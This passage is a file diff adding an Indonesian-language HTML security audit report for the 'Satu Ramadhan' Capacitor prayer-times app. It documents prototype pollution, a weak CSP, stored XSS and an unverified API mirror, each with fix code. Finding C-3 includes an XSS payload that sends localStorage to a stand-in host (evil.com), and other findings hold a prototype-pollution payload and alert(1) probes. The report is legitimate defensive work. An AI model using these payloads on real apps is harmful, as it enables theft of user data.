@@ -1,0 +1,1136 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Laporan Keamanan — Satu Ramadhan</title>
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  :root {
+    --bg: #f9f8f5;
+    --surface: #ffffff;
+    --border: #e5e3da;
+    --text: #1a1a18;
+    --muted: #5f5e5a;
+    --hint: #9c9a92;
+    --crit: #a32d2d; --crit-bg: #fcebeb; --crit-border: #f09595;
+    --high: #854f0b; --high-bg: #faeeda; --high-border: #ef9f27;
+    --med: #185fa5; --med-bg: #e6f1fb; --med-border: #85b7eb;
+    --low: #0f6e56; --low-bg: #e1f5ee; --low-border: #5dcaa5;
+    --info: #534ab7; --info-bg: #eeedfe; --info-border: #afa9ec;
+    --code-bg: #f1efe8;
+    --radius: 8px;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    font-size: 15px;
+    line-height: 1.65;
+    color: var(--text);
+    background: var(--bg);
+  }
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --bg: #1a1a18; --surface: #242421; --border: #3a3a36;
+      --text: #e8e6df; --muted: #9c9a92; --hint: #6b6a64;
+      --crit: #f09595; --crit-bg: #2a1212; --crit-border: #7a2020;
+      --high: #fac775; --high-bg: #2a1e08; --high-border: #7a4a0a;
+      --med: #85b7eb; --med-bg: #0a1a2e; --med-border: #1a4a7a;
+      --low: #5dcaa5; --low-bg: #081e16; --low-border: #0a4a30;
+      --info: #afa9ec; --info-bg: #14122a; --info-border: #3a2880;
+      --code-bg: #2c2c2a;
+    }
+  }
+  body { padding: 32px 20px 64px; max-width: 900px; margin: 0 auto; }
+
+  .report-header { margin-bottom: 40px; padding-bottom: 24px; border-bottom: 1px solid var(--border); }
+  .report-header h1 { font-size: 26px; font-weight: 600; margin-bottom: 6px; }
+  .report-header .meta { color: var(--muted); font-size: 13px; display: flex; gap: 20px; flex-wrap: wrap; margin-top: 8px; }
+  .report-header .meta span { display: flex; align-items: center; gap: 4px; }
+
+  .summary-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 12px; margin-bottom: 40px; }
+  .summary-card { padding: 16px; border-radius: var(--radius); border: 1px solid; text-align: center; }
+  .summary-card .count { font-size: 32px; font-weight: 700; line-height: 1; margin-bottom: 4px; }
+  .summary-card .label { font-size: 12px; font-weight: 500; text-transform: uppercase; letter-spacing: 0.05em; }
+  .summary-card.crit { background: var(--crit-bg); border-color: var(--crit-border); color: var(--crit); }
+  .summary-card.high { background: var(--high-bg); border-color: var(--high-border); color: var(--high); }
+  .summary-card.med  { background: var(--med-bg);  border-color: var(--med-border);  color: var(--med); }
+  .summary-card.low  { background: var(--low-bg);  border-color: var(--low-border);  color: var(--low); }
+  .summary-card.info { background: var(--info-bg); border-color: var(--info-border); color: var(--info); }
+
+  h2 { font-size: 18px; font-weight: 600; margin: 40px 0 16px; padding-bottom: 8px; border-bottom: 1px solid var(--border); }
+  h3 { font-size: 15px; font-weight: 600; margin-bottom: 4px; }
+
+  .section-intro { color: var(--muted); margin-bottom: 20px; font-size: 14px; }
+
+  .finding { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius); margin-bottom: 16px; overflow: hidden; }
+  .finding-header { padding: 14px 16px; display: flex; align-items: flex-start; gap: 12px; cursor: pointer; user-select: none; }
+  .finding-header:hover { background: var(--bg); }
+  .badge { font-size: 11px; font-weight: 600; padding: 2px 8px; border-radius: 99px; white-space: nowrap; flex-shrink: 0; margin-top: 2px; }
+  .badge.crit { background: var(--crit-bg); color: var(--crit); border: 1px solid var(--crit-border); }
+  .badge.high { background: var(--high-bg); color: var(--high); border: 1px solid var(--high-border); }
+  .badge.med  { background: var(--med-bg);  color: var(--med);  border: 1px solid var(--med-border); }
+  .badge.low  { background: var(--low-bg);  color: var(--low);  border: 1px solid var(--low-border); }
+  .badge.info { background: var(--info-bg); color: var(--info); border: 1px solid var(--info-border); }
+  .finding-title { flex: 1; font-weight: 500; font-size: 15px; }
+  .finding-toggle { color: var(--hint); font-size: 18px; flex-shrink: 0; transition: transform 0.2s; }
+  .finding.open .finding-toggle { transform: rotate(180deg); }
+
+  .finding-body { display: none; padding: 0 16px 16px; border-top: 1px solid var(--border); }
+  .finding.open .finding-body { display: block; }
+
+  .finding-meta { display: flex; flex-wrap: wrap; gap: 16px; margin: 12px 0; font-size: 13px; color: var(--muted); }
+  .finding-meta strong { color: var(--text); }
+
+  .finding-body h3 { margin-top: 16px; margin-bottom: 6px; font-size: 13px; font-weight: 600; color: var(--muted); text-transform: uppercase; letter-spacing: 0.05em; }
+  .finding-body p { font-size: 14px; margin-bottom: 8px; color: var(--text); }
+  .finding-body ul { padding-left: 20px; font-size: 14px; margin-bottom: 8px; }
+  .finding-body ul li { margin-bottom: 4px; }
+
+  pre { background: var(--code-bg); border-radius: 6px; padding: 12px 14px; font-size: 12.5px; overflow-x: auto; margin: 8px 0; border: 1px solid var(--border); }
+  code { font-family: "Cascadia Code", "Fira Code", "Menlo", monospace; font-size: 12.5px; background: var(--code-bg); padding: 1px 5px; border-radius: 4px; }
+
+  .fix-box { background: var(--low-bg); border: 1px solid var(--low-border); border-radius: 6px; padding: 10px 14px; margin-top: 10px; font-size: 13px; }
+  .fix-box strong { color: var(--low); display: block; margin-bottom: 4px; font-size: 12px; text-transform: uppercase; letter-spacing: 0.04em; }
+
+  .toc { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius); padding: 16px 20px; margin-bottom: 36px; }
+  .toc h2 { margin: 0 0 10px; font-size: 14px; border: none; padding: 0; text-transform: uppercase; letter-spacing: 0.06em; color: var(--muted); }
+  .toc ol { padding-left: 18px; font-size: 13.5px; }
+  .toc li { margin-bottom: 3px; }
+  .toc a { color: var(--med); text-decoration: none; }
+  .toc a:hover { text-decoration: underline; }
+
+  .disclaimer { background: var(--info-bg); border: 1px solid var(--info-border); border-radius: var(--radius); padding: 14px 16px; font-size: 13px; color: var(--muted); margin-bottom: 32px; }
+  .disclaimer strong { color: var(--info); }
+</style>
+</head>
+<body>
+
+<div class="report-header">
+  <h1>Laporan Analisis Keamanan Aplikasi</h1>
+  <div style="font-size:18px;color:var(--muted);margin-top:2px">Satu Ramadhan — Capacitor.js / WebView</div>
+  <div class="meta">
+    <span>📅 April 2025</span>
+    <span>🎯 Target: Play Store Release</span>
+    <span>🔬 Metode: Static Code Analysis</span>
+    <span>📁 Scope: Client-side JavaScript, CSP, Storage</span>
+  </div>
+</div>
+
+<div class="disclaimer">
+  <strong>Catatan:</strong> Analisis ini dilakukan secara statis terhadap source code yang diberikan. Tidak ada pengujian dinamis (runtime) yang dilakukan. Temuan bersifat teoritis berdasarkan pola kode yang rentan — tingkat risiko aktual di production dapat bervariasi tergantung konteks deployment dan konfigurasi WebView.
+</div>
+
+<div class="summary-grid">
+  <div class="summary-card crit"><div class="count">3</div><div class="label">Kritis</div></div>
+  <div class="summary-card high"><div class="count">7</div><div class="label">Tinggi</div></div>
+  <div class="summary-card med"><div class="count">8</div><div class="label">Sedang</div></div>
+  <div class="summary-card low"><div class="count">5</div><div class="label">Rendah</div></div>
+  <div class="summary-card info"><div class="count">4</div><div class="label">Informatif</div></div>
+</div>
+
+<div class="toc">
+  <h2>Daftar Isi</h2>
+  <ol>
+    <li><a href="#critical">Kerentanan Kritis (Critical)</a></li>
+    <li><a href="#high">Kerentanan Tinggi (High)</a></li>
+    <li><a href="#medium">Kerentanan Sedang (Medium)</a></li>
+    <li><a href="#low">Kerentanan Rendah (Low)</a></li>
+    <li><a href="#informational">Informatif</a></li>
+  </ol>
+</div>
+
+<!-- ═══════════════════════════════════════════════════ -->
+<h2 id="critical">🔴 Kerentanan Kritis (Critical)</h2>
+<p class="section-intro">Kerentanan ini harus diperbaiki sebelum release ke Play Store. Berpotensi menyebabkan kerusakan signifikan pada keamanan pengguna.</p>
+
+<!-- C-1 -->
+<div class="finding" id="C1">
+  <div class="finding-header" onclick="toggle(this)">
+    <span class="badge crit">KRITIS</span>
+    <span class="finding-title">C-1 · Prototype Pollution via Manipulasi Storage Persisten</span>
+    <span class="finding-toggle">▼</span>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <span><strong>File:</strong> src/js/core/store.js — fungsi <code>_mergeConfig()</code></span>
+      <span><strong>CWE:</strong> CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object)</span>
+    </div>
+    <h3>Deskripsi</h3>
+    <p>Fungsi <code>_mergeConfig()</code> yang digunakan untuk menggabungkan state tersimpan dari Capacitor Preferences ke state aplikasi menggunakan <code>for...in</code> loop dan bracket notation untuk assignment. Ini membuka celah prototype pollution.</p>
+    <p>Pada Capacitor Android, data <code>Preferences</code> disimpan di <code>SharedPreferences</code> yang dapat dimanipulasi di perangkat yang di-root. Jika penyerang menyisipkan JSON dengan key <code>"__proto__"</code>, maka <code>Object.prototype</code> bisa tercemar.</p>
+    <pre>
+// src/js/core/store.js
+_mergeConfig(target, source) {
+    const result = { ...target };
+    for (const key in source) {          // ← iterates enumerable props termasuk __proto__
+        if (source[key] && typeof source[key] === 'object' && !Array.isArray(source[key])) {
+            result[key] = this._mergeConfig(target[key] || {}, source[key]);
+        } else {
+            result[key] = source[key];   // ← result["__proto__"] = ... mengubah prototype!
+        }
+    }
+    return result;
+}</pre>
+    <p>Payload berbahaya di storage:</p>
+    <pre>
+// Jika SharedPreferences berisi:
+{"__proto__": {"isAdmin": true, "malicious": "&lt;script&gt;alert(1)&lt;/script&gt;"}}
+
+// Setelah _mergeConfig dipanggil:
+console.log({}.isAdmin);   // → true  (Object.prototype terkontaminasi)
+console.log({}.malicious); // → "&lt;script&gt;..."</pre>
+    <h3>Dampak</h3>
+    <ul>
+      <li>Kontaminasi <code>Object.prototype</code> mempengaruhi seluruh runtime JavaScript aplikasi</li>
+      <li>Dapat memanipulasi logika aplikasi (melewati pemeriksaan kondisi, mengubah perilaku fungsi)</li>
+      <li>Bisa menjadi stepping stone untuk serangan lanjutan termasuk XSS jika nilai yang tercemar dirender ke DOM</li>
+      <li>Meski membutuhkan akses root atau manipulasi storage, ini tetap merupakan attack surface yang valid</li>
+    </ul>
+    <div class="fix-box">
+      <strong>Rekomendasi Perbaikan</strong>
+      Tambahkan guard untuk key berbahaya dan gunakan <code>Object.hasOwn()</code>, serta pertimbangkan menggunakan <code>structuredClone()</code>:
+      <pre style="margin-top:8px">
+_mergeConfig(target, source) {
+    const FORBIDDEN_KEYS = new Set(['__proto__', 'constructor', 'prototype']);
+    const result = Object.create(null);  // atau { ...target }
+    Object.assign(result, target);
+    for (const key of Object.keys(source)) { // Object.keys() tidak iterasi prototype
+        if (FORBIDDEN_KEYS.has(key)) continue;
+        if (source[key] !== null && typeof source[key] === 'object' && !Array.isArray(source[key])) {
+            result[key] = this._mergeConfig(target[key] || {}, source[key]);
+        } else {
+            result[key] = source[key];
+        }
+    }
+    return result;
+}</pre>
+    </div>
+  </div>
+</div>
+
+<!-- C-2 -->
+<div class="finding" id="C2">
+  <div class="finding-header" onclick="toggle(this)">
+    <span class="badge crit">KRITIS</span>
+    <span class="finding-title">C-2 · Content Security Policy Tidak Efektif — 'unsafe-inline' dan 'unsafe-eval'</span>
+    <span class="finding-toggle">▼</span>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <span><strong>File:</strong> index.html — meta tag CSP</span>
+      <span><strong>CWE:</strong> CWE-1021 (Improper Restriction of Rendered UI Layers)</span>
+    </div>
+    <h3>Deskripsi</h3>
+    <p>CSP saat ini mengandung <code>'unsafe-inline'</code> dan <code>'unsafe-eval'</code> di direktif <code>script-src</code> dan <code>default-src</code>, yang sepenuhnya meniadakan perlindungan XSS yang seharusnya diberikan oleh CSP.</p>
+    <pre>
+&lt;!-- index.html — CSP saat ini --&gt;
+&lt;meta http-equiv="Content-Security-Policy" content="
+  default-src 'self' data: gap: https://ssl.gstatic.com 'unsafe-inline' 'unsafe-eval';
+  script-src  'self' 'unsafe-inline' 'unsafe-eval';
+  ...
+"/&gt;</pre>
+    <h3>Dampak</h3>
+    <ul>
+      <li>Jika ada XSS dari sumber manapun, tidak ada mitigasi dari CSP — script injeksi langsung dieksekusi</li>
+      <li><code>'unsafe-eval'</code> mengizinkan <code>eval()</code>, <code>new Function()</code>, <code>setTimeout("string")</code> — meningkatkan attack surface secara signifikan</li>
+      <li>Inline event handler seperti <code>onclick="..."</code> di <code>empty-state.js</code> dapat dieksploitasi</li>
+      <li>Play Store / Google Play Protect semakin ketat terhadap CSP yang lemah untuk app WebView</li>
+    </ul>
+    <div class="fix-box">
+      <strong>Rekomendasi Perbaikan</strong>
+      Hapus <code>'unsafe-inline'</code> dan <code>'unsafe-eval'</code>. Ganti inline event handler dengan <code>addEventListener()</code>. Jika bundler (Vite) menggunakan eval, gunakan <code>'strict-dynamic'</code> dengan nonce atau hash:
+      <pre style="margin-top:8px">
+&lt;!-- CSP yang lebih aman (sesuaikan dengan kebutuhan Capacitor) --&gt;
+default-src 'self';
+script-src  'self' 'nonce-{nonce}';
+style-src   'self' 'unsafe-inline';  &lt;!-- style masih perlu unsafe-inline untuk CSS-in-JS --&gt;
+connect-src 'self' https://api.aladhan.com https://*.openstreetmap.org;
+img-src     'self' data: blob: https://*.openstreetmap.org;
+font-src    'self' data:;</pre>
+    </div>
+  </div>
+</div>
+
+<!-- C-3 -->
+<div class="finding" id="C3">
+  <div class="finding-header" onclick="toggle(this)">
+    <span class="badge crit">KRITIS</span>
+    <span class="finding-title">C-3 · Stored XSS via Input Pengguna di Preset Manager</span>
+    <span class="finding-toggle">▼</span>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <span><strong>File:</strong> src/js/components/modal/preset-manager-modal.js — <code>renderPresetItem()</code>, <code>showEditForm()</code></span>
+      <span><strong>CWE:</strong> CWE-79 (Cross-site Scripting — Stored)</span>
+    </div>
+    <h3>Deskripsi</h3>
+    <p>Pengguna dapat memasukkan nama organisasi dan deskripsi preset kustom melalui form input. Data ini disimpan ke Capacitor Preferences, kemudian dirender kembali ke DOM melalui <code>innerHTML</code> tanpa sanitasi apapun.</p>
+    <pre>
+// renderPresetItem() — data langsung ke innerHTML tanpa escaping
+`&lt;div class="preset-mgr-item-name"&gt;
+    ${preset.name}         // ← TIDAK DISANITASI — Stored XSS
+    ${activeBadge}
+&lt;/div&gt;`
+
+// showEditForm() — nilai user di atribut HTML
+`&lt;input ... value="${preset.name}" ...&gt;`  // ← bisa merusak atribut jika mengandung "
+`&lt;input ... value="${preset.description || ''}" ...&gt;` // ← sama</pre>
+    <h3>Skenario Serangan</h3>
+    <p>Pengguna (atau script lain yang bisa menulis ke storage) memasukkan nama preset:</p>
+    <pre>
+// Input nama preset:
+&lt;img src=x onerror="fetch('https://evil.com?d='+JSON.stringify(localStorage))"&gt;
+
+// Saat renderPresetItem() dipanggil, innerHTML menjadi:
+&lt;div class="preset-mgr-item-name"&gt;
+    &lt;img src=x onerror="fetch('https://evil.com?...')"&gt;   // ← DIEKSEKUSI
+&lt;/div&gt;</pre>
+    <p>Dalam konteks Capacitor/WebView, serangan ini bisa mengakses semua state aplikasi, sessionStorage, dan memanggil Capacitor plugin bridge jika ada jembatan yang tidak terlindungi.</p>
+    <h3>Dampak</h3>
+    <ul>
+      <li>Eksekusi JavaScript arbitrary dalam konteks aplikasi</li>
+      <li>Akses ke seluruh data di memori aplikasi dan storage</li>
+      <li>Potensi pivoting ke native layer via Capacitor plugin bridge</li>
+      <li>Serangan ini persisten — dieksekusi setiap kali preset manager dibuka</li>
+    </ul>
+    <div class="fix-box">
+      <strong>Rekomendasi Perbaikan</strong>
+      Buat fungsi escapeHtml() dan terapkan ke SEMUA data user yang dirender via innerHTML:
+      <pre style="margin-top:8px">
+// utils/sanitize.js
+export function escapeHtml(str) {
+    if (str == null) return '';
+    return String(str)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#x27;');
+}
+
+// Penggunaan di renderPresetItem:
+`&lt;div class="preset-mgr-item-name"&gt;${escapeHtml(preset.name)}&lt;/div&gt;`
+
+// Untuk input value di atribut HTML:
+`&lt;input value="${escapeHtml(preset.name)}"&gt;`
+
+// ATAU — gunakan textContent / createElement (lebih aman):
+const nameEl = document.createElement('div');
+nameEl.textContent = preset.name;  // otomatis aman
+container.appendChild(nameEl);</pre>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════ -->
+<h2 id="high">🟠 Kerentanan Tinggi (High)</h2>
+<p class="section-intro">Harus diperbaiki sebelum release. Berpotensi menyebabkan XSS dari data pihak ketiga (API eksternal).</p>
+
+<!-- H-1 -->
+<div class="finding" id="H1">
+  <div class="finding-header" onclick="toggle(this)">
+    <span class="badge high">TINGGI</span>
+    <span class="finding-title">H-1 · XSS via Data Nominatim API — Location Search Modal</span>
+    <span class="finding-toggle">▼</span>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <span><strong>File:</strong> src/js/components/modal/location-search-modal.js — <code>renderResultItem()</code></span>
+      <span><strong>CWE:</strong> CWE-79 (Cross-site Scripting — Reflected/Stored from External Source)</span>
+    </div>
+    <h3>Deskripsi</h3>
+    <p>Data dari Nominatim OpenStreetMap API (nama lokasi, nama provinsi) dirender langsung ke DOM melalui <code>innerHTML</code> tanpa sanitasi. Meskipun Nominatim adalah layanan terpercaya, data OpenStreetMap bersifat user-contributed — siapapun bisa berkontribusi nama lokasi yang mengandung HTML.</p>
+    <pre>
+// renderResultItem() — data API langsung ke innerHTML
+function renderResultItem(location) {
+    const displayName = location.districtName
+        ? `${location.districtName}, ${location.regencyName}`  // ← tidak di-escape
+        : location.regencyName;
+    return `
+        &lt;div class="loc-search-item"&gt;
+            &lt;div class="loc-search-item-title"&gt;${displayName}&lt;/div&gt;     // ← RENTAN
+            &lt;div class="loc-search-item-subtitle"&gt;${location.provinceName || ''}...&lt;/div&gt;  // ← RENTAN
+        &lt;/div&gt;
+    `;
+}</pre>
+    <h3>Dampak</h3>
+    <ul>
+      <li>Jika ada entry di OpenStreetMap dengan nama yang mengandung HTML, setiap pengguna yang mencari lokasi tersebut akan ter-eksploit</li>
+      <li>Serangan supply-chain: kompromi server Nominatim → injeksi XSS ke semua pengguna aplikasi</li>
+    </ul>
+    <div class="fix-box">
+      <strong>Rekomendasi Perbaikan</strong>
+      Terapkan <code>escapeHtml()</code> ke semua data dari Nominatim sebelum dimasukkan ke template string innerHTML.
+    </div>
+  </div>
+</div>
+
+<!-- H-2 -->
+<div class="finding" id="H2">
+  <div class="finding-header" onclick="toggle(this)">
+    <span class="badge high">TINGGI</span>
+    <span class="finding-title">H-2 · XSS via Data Lokasi yang Tidak Disanitasi di Location Card</span>
+    <span class="finding-toggle">▼</span>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <span><strong>File:</strong> src/js/components/card/location-card.js — <code>renderLocationCardInner()</code></span>
+    </div>
+    <h3>Deskripsi</h3>
+    <p>Nama lokasi yang tersimpan di Preferences (berasal dari Nominatim atau input manual) dirender ke DOM tanpa escaping. Ini tampil di hampir setiap halaman (Home, Schedule, Compass).</p>
+    <pre>
+// renderLocationCardInner() — data dari store/storage langsung ke innerHTML
+const name = location.districtName
+    ? `${location.districtName}, ${location.regencyName}`  // ← tidak di-escape
+    : location.regencyName;
+
+return `
+    &lt;div class="location-card__name"&gt;${name}&lt;/div&gt;        // ← RENTAN
+    &lt;div class="location-card__province"&gt;${province}&lt;/div&gt; // ← RENTAN
+`;</pre>
+    <h3>Dampak</h3>
+    <ul>
+      <li>Data berbahaya yang tersimpan dari sumber manapun (Nominatim, hasil search) akan muncul di semua halaman yang menampilkan location card</li>
+      <li>Ini adalah persistent XSS — dieksekusi setiap kali aplikasi dimuat</li>
+    </ul>
+    <div class="fix-box">
+      <strong>Rekomendasi Perbaikan</strong>
+      Gunakan <code>escapeHtml()</code> pada <code>name</code> dan <code>province</code>, atau gunakan <code>textContent</code> dengan <code>createElement()</code>.
+    </div>
+  </div>
+</div>
+
+<!-- H-3 -->
+<div class="finding" id="H3">
+  <div class="finding-header" onclick="toggle(this)">
+    <span class="badge high">TINGGI</span>
+    <span class="finding-title">H-3 · XSS via Data Lokasi di Settings Location Card & Preset Card</span>
+    <span class="finding-toggle">▼</span>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <span><strong>File:</strong> src/js/components/settings/settings-loc-card.js, settings-preset-card.js</span>
+    </div>
+    <h3>Deskripsi</h3>
+    <p>Sama dengan H-2, data lokasi dan nama preset dirender ke halaman Settings tanpa sanitasi:</p>
+    <pre>
+// settings-loc-card.js — renderStatus()
+return `&lt;div class="settings-loc-body"&gt;
+    &lt;div class="settings-loc-regency"&gt;${displayName}&lt;/div&gt;   // ← RENTAN
+    &lt;div class="settings-loc-province"&gt;${loc.provinceName}&lt;/div&gt; // ← RENTAN
+&lt;/div&gt;`;
+
+// settings-preset-card.js — renderCardContent()
+`&lt;div class="settings-preset-org"&gt;${name}&lt;/div&gt;`  // ← RENTAN
+`&lt;div class="settings-preset-dates"&gt;${startStr} — ${endStr}&lt;/div&gt;`</pre>
+    <div class="fix-box">
+      <strong>Rekomendasi Perbaikan</strong>
+      Terapkan escaping konsisten di semua komponen settings yang menampilkan data dari storage.
+    </div>
+  </div>
+</div>
+
+<!-- H-4 -->
+<div class="finding" id="H4">
+  <div class="finding-header" onclick="toggle(this)">
+    <span class="badge high">TINGGI</span>
+    <span class="finding-title">H-4 · XSS via Data API Aladhan — Schedule Card</span>
+    <span class="finding-toggle">▼</span>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <span><strong>File:</strong> src/js/components/card/schedule-card.js — <code>renderDateNav()</code>, <code>updateScheduleContent()</code></span>
+    </div>
+    <h3>Deskripsi</h3>
+    <p>Data dari API Aladhan (nama hari Hijri, nama bulan, nama hari dalam seminggu) dirender langsung ke innerHTML. Meskipun Aladhan adalah API terpercaya, ini membuka vektor supply-chain attack.</p>
+    <pre>
+// renderDateNav() — data dari API ke innerHTML
+`&lt;span class="schedule-nav__title"&gt;
+    ${hijriDay} ${hijriMonthName} ${hijriYear}  // ← tidak di-escape
+&lt;/span&gt;`
+
+// updateScheduleContent() — data dari i18n DAN API
+`${t('components/ui/header:days', ...)[entry.date.getDay()]}` // ← dari i18n, lebih aman
+`${formatGregorianDateFromObj(entry.date, months)}`  // ← dari i18n, lebih aman
+// tapi:
+titleEl.textContent = `${entry.hijriDay} ${entry.hijriMonthName} ${entry.hijriYear}`;
+// ← ini textContent (AMAN!) — tapi versi renderDateNav menggunakan innerHTML (TIDAK AMAN)</pre>
+    <h3>Catatan Penting</h3>
+    <p>Inkonsistensi terdeteksi: beberapa tempat menggunakan <code>textContent</code> (aman) tapi template string awal menggunakan <code>innerHTML</code> dengan data yang sama (tidak aman). Ini menunjukkan pola yang tidak konsisten di seluruh kodebase.</p>
+    <div class="fix-box">
+      <strong>Rekomendasi Perbaikan</strong>
+      Standarisasi: selalu gunakan <code>escapeHtml()</code> untuk data yang berasal dari API eksternal saat dimasukkan ke template literal innerHTML.
+    </div>
+  </div>
+</div>
+
+<!-- H-5 -->
+<div class="finding" id="H5">
+  <div class="finding-header" onclick="toggle(this)">
+    <span class="badge high">TINGGI</span>
+    <span class="finding-title">H-5 · XSS via Data Quran Local JSON di Quran Card</span>
+    <span class="finding-toggle">▼</span>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <span><strong>File:</strong> src/js/components/quran/quran-card.js — <code>createSurahCard()</code>, <code>createJuzCard()</code>, <code>createBookmarkCard()</code></span>
+    </div>
+    <h3>Deskripsi</h3>
+    <p>Nama surah, tipe, dan jumlah ayat dari file JSON lokal dirender melalui <code>innerHTML</code>. Meskipun saat ini file JSON adalah bundled resource (aman), pola ini membentuk kebiasaan yang berbahaya dan jika ada mekanisme update file JSON di masa depan, ini menjadi attack surface.</p>
+    <pre>
+// createSurahCard()
+card.innerHTML = `
+    &lt;div class="surah-title-latin"&gt;${surah.title}&lt;/div&gt;       // ← innerHTML tanpa escape
+    &lt;span class="surah-type-pill"&gt;${typeText}&lt;/span&gt;          // ← dari t(), relatif aman
+    &lt;div class="surah-title-arabic"&gt;${surah.titleAr}&lt;/div&gt;   // ← innerHTML tanpa escape
+`;</pre>
+    <div class="fix-box">
+      <strong>Rekomendasi Perbaikan</strong>
+      Gunakan <code>document.createElement()</code> dan <code>textContent</code> untuk teks dari sumber manapun, atau terapkan escaping konsisten. Ini juga sebagai "defense in depth" untuk bundled resources.
+    </div>
+  </div>
+</div>
+
+<!-- H-6 -->
+<div class="finding" id="H6">
+  <div class="finding-header" onclick="toggle(this)">
+    <span class="badge high">TINGGI</span>
+    <span class="finding-title">H-6 · Notification Module Menggunakan innerHTML untuk Message</span>
+    <span class="finding-toggle">▼</span>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <span><strong>File:</strong> src/js/modules/notification/notification.js — <code>show()</code></span>
+    </div>
+    <h3>Deskripsi</h3>
+    <p>Fungsi notifikasi in-app menggunakan <code>innerHTML</code> untuk merender pesan. Meskipun sebagian besar pesan melalui i18next (dengan <code>escapeValue: true</code>), ada jalur di mana pesan bisa mengandung data tidak ter-escape.</p>
+    <pre>
+// notification.js
+el.innerHTML = `
+    &lt;span class="notif__icon"&gt;${icon}&lt;/span&gt;
+    &lt;span class="notif__message"&gt;${message}&lt;/span&gt;  // ← innerHTML!
+`;
+
+// Contoh pemanggilan yang potensial rentan:
+notif.success(t('...', { name: displayName }));
+// Jika displayName = '&lt;img src=x onerror=alert(1)&gt;'
+// i18next dengan escapeValue:true AKAN men-escape ini → aman
+// TAPI jika ada pemanggilan langsung tanpa melalui t():
+notif.show(rawUserData);  // ← jika ada, ini berbahaya</pre>
+    <h3>Catatan</h3>
+    <p>Saat ini sebagian besar pemanggilan melalui i18next yang melakukan escaping. Namun menggunakan <code>innerHTML</code> untuk pesan notifikasi adalah anti-pattern yang berbahaya — sangat mudah lupa melakukan escaping saat menambah kode baru di masa depan.</p>
+    <div class="fix-box">
+      <strong>Rekomendasi Perbaikan</strong>
+      Ganti innerHTML dengan textContent untuk bagian message, atau pastikan semua pesan di-escape. Gunakan <code>innerText</code> atau <code>textContent</code> untuk message teks biasa.
+    </div>
+  </div>
+</div>
+
+<!-- H-7 -->
+<div class="finding" id="H7">
+  <div class="finding-header" onclick="toggle(this)">
+    <span class="badge high">TINGGI</span>
+    <span class="finding-title">H-7 · API Mirror dari Domain Tidak Terverifikasi (alislam.ru)</span>
+    <span class="finding-toggle">▼</span>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <span><strong>File:</strong> src/js/core/api.js — konstanta <code>API_MIRRORS</code></span>
+      <span><strong>CWE:</strong> CWE-494 (Download of Code Without Integrity Check)</span>
+    </div>
+    <h3>Deskripsi</h3>
+    <p>Aplikasi menggunakan tiga API mirror, salah satunya berasal dari domain <code>.ru</code> yang tidak memiliki asosiasi resmi yang jelas dengan Aladhan:</p>
+    <pre>
+const API_MIRRORS = [
+    'https://api.aladhan.com/v1',
+    'https://aladhan.api.islamic.network/v1',
+    'https://aladhan.api.alislam.ru/v1',  // ← domain tidak terverifikasi
+];</pre>
+    <p>Jika mirror ini dikompromikan atau dioperasikan dengan itikad buruk, ia dapat mengembalikan data waktu sholat yang salah. Validasi hanya memeriksa struktur respons, bukan keaslian konten.</p>
+    <h3>Dampak</h3>
+    <ul>
+      <li>Waktu sholat yang diberikan bisa salah (misal imsak dipercepat, maghrib diperlambat) — ini secara langsung berdampak pada ibadah pengguna</li>
+      <li>Dalam skenario terburuk, data berbahaya bisa berujung ke XSS jika ada celah di rendering</li>
+    </ul>
+    <div class="fix-box">
+      <strong>Rekomendasi Perbaikan</strong>
+      Hapus mirror yang tidak terverifikasi. Jika butuh redundansi, gunakan hanya mirror resmi yang terdaftar di dokumentasi Aladhan API. Tambahkan validasi konten (range check untuk nilai waktu, misalnya memeriksa apakah jam imsak berada dalam rentang yang masuk akal).
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════ -->
+<h2 id="medium">🟡 Kerentanan Sedang (Medium)</h2>
+<p class="section-intro">Penting untuk diperbaiki sebelum atau segera setelah release. Meningkatkan permukaan serangan secara signifikan.</p>
+
+<!-- M-1 -->
+<div class="finding" id="M1">
+  <div class="finding-header" onclick="toggle(this)">
+    <span class="badge med">SEDANG</span>
+    <span class="finding-title">M-1 · Fungsi Callback Ter-expose di Window Global</span>
+    <span class="finding-toggle">▼</span>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <span><strong>File:</strong> src/js/pages/home-page.js</span>
+      <span><strong>CWE:</strong> CWE-668 (Exposure of Resource to Wrong Sphere)</span>
+    </div>
+    <h3>Deskripsi</h3>
+    <p>Sebuah fungsi callback diekspos ke objek <code>window</code> global untuk digunakan dalam inline event handler. Ini mengekspos logika internal aplikasi ke konteks global yang bisa diakses oleh script lain atau via XSS.</p>
+    <pre>
+// home-page.js
+if (!window._homeShowManualSearch) {
+    window._homeShowManualSearch = () => {
+        showLocationSearchModal({ ... });
+    };
+}
+
+// Digunakan sebagai inline onclick:
+onclick: '_homeShowManualSearch()'</pre>
+    <h3>Dampak</h3>
+    <ul>
+      <li>Setiap XSS atau script yang berjalan di konteks aplikasi bisa memanggil <code>window._homeShowManualSearch()</code> secara arbitrary</li>
+      <li>Menandai pola arsitektur yang buruk yang bisa meluas jika tidak diatasi</li>
+    </ul>
+    <div class="fix-box">
